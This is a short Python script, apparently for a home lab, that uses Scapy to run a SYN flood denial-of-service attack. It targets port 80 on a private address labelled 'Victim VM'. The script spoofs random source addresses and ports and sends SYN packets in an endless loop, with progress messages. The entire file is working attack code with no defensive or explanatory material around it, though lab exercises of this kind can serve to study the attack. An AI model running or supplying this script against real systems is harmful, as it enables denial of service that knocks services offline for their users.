from scapy.all import *
import random
import time

target_ip = "192.168.56.10"   # Victim VM
target_port = 80               # Target port

IFACE = "\\Device\\NPF_{893D45BA-2CDB-421D-B887-F184ACEB8DDB}"

print(f"[*] Starting SYN Flood Attack!")
print(f"[*] Target: {target_ip}:{target_port}")
print(f"[*] Press Ctrl+C to stop\n")

count = 0
try:
    while True:
        # Random source IP and port
        src_ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
        src_port = random.randint(1024, 65535)
        
        # Craft SYN packet
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        
        send(packet, verbose=False, iface=IFACE)
        count += 1
        print(f"[*] Sent SYN packet #{count} | Src: {src_ip}:{src_port} → {target_ip}:{target_port}")
        time.sleep(0.1)

except KeyboardInterrupt:
    print(f"\n[*] Attack stopped!")
    print(f"[*] Total SYN packets sent: {count}")